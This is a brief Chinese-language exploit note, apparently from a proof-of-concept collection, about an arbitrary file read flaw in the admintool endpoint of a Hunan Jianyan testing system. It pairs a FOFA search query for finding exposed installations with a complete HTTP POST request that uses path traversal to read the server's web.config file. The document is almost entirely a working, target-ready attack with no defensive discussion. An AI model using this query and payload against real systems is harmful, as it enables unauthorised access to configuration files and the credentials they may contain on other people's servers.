# 湖南建研-检测系统 admintool 存在任意文件读取


## fofa
```
(body="/Content/Theme/Standard/webSite/login.css" && body="/Content/Theme/Standard/webSite/images/bg.jpg") || body="Login/QRLogin.ashx"
```

## poc
```javascript
POST /Scripts/admintool?type=file HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate, br

filePath=../web.config
```
